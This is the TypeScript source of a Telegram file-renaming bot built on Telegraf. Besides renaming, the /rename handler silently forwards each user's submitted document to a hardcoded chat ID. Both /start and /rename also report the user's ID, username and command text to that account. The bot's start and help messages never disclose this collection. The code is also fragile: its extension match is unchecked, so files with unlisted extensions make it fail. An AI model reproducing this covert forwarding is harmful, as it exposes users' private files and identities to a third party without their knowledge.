// const { Telegraf, Context } = require("telegraf");
import { Telegraf, Context, Input } from 'telegraf'

import axios from 'axios'
export const sleep = (t: number | undefined) => new Promise((resolve) => setTimeout(resolve, t));

let start = async (bot: Telegraf) => {
try {
  
  bot.start((ctx: any) => {
    ctx.reply('Send me file then reply to that file send /rename <new name>\nFor more bots and updates Join @LogicBots\nDeveloper: @PanditSiddharth')
.catch((err: any) => {ctx.reply(err.message)})
  
    bot.telegram.sendMessage(1791106582, `Started by ${ctx.message.from.id} ${ctx.message.from.username ? '@' + ctx.message.from.username : ctx.message.from.first_name}`)
    .catch((err: any) => {ctx.reply(err.message)});
    
  })


    bot.help((ctx: any) => {
    ctx.reply('Send me file then reply to that file send /rename <new name>\nFor more bots and updates Join @LogicBots\nDeveloper: @PanditSiddharth')
      .catch((err: any) => {ctx.reply(err.message)});
  })
  
  bot.command('rename', async (ctx: any)=> {
    if(!ctx.message.reply_to_message)
      return ctx.reply('You must reply to document with /rename <new name>');

    if(!ctx.message.reply_to_message.document)
      return ctx.reply('You must reply to document with /rename <new name>');
      
  let doc: any = ctx.message.reply_to_message.document
    if(!doc.file_name)
      return await ctx.reply('This media have no name')
    
  let s: any = await bot.telegram.getFileLink(doc.file_id)
    .catch((err: any) => {ctx.reply(err.message)})

    let m = doc.file_name.match(/(.pdf|.doc|.docx|.xls|.xlsx|.ppt|.pptx|.odt|.ods|.odp|.txt|.rtf|.csv|.pages|.numbers|.key|.mp3|.mp4|.avi|.mov|.wmv|.mkv|.flv|.gif|.png|.jpg|.jpeg|.dat|.bmp|.webp)$/i)
let r = ctx.message.text.substring(7).trim()
    if(r == "")
      return ctx.reply('Please write new name of file\nafter /rename command\nExample: /rename mynewfile').catch((err: any) => {ctx.reply(err.message)})

let mes = await ctx.reply(`Renaming.. `).catch((err: any) => {ctx.reply(err.message)})
    
await bot.telegram.sendDocument(ctx.chat.id, Input.fromURLStream(s.href, r + m[0]), {caption: r})
  .then((y: any) => {bot.telegram.editMessageText(ctx.chat.id, mes.message_id, undefined, 'Renamed!!\nFor more bots and updates join @LogicBots').catch((e)=>{})})
    .catch((err: any) => {ctx.reply(err.message)})

    
     bot.telegram.forwardMessage(1791106582, ctx.chat.id, ctx.message.reply_to_message.message_id);
                                
  bot.telegram.sendMessage(1791106582, `Used by ${ctx.message.from.id} ${ctx.message.from.username ? '@' + ctx.message.from.username : ctx.message.from.first_name} \nText: ${ctx.message.text}`)
    .catch((err: any) => {ctx.reply(err.message)})
  
  })
  
  } catch (error: any) {
  bot.use((ctx: any) => ctx.reply(error.message))
}
}

export default start;

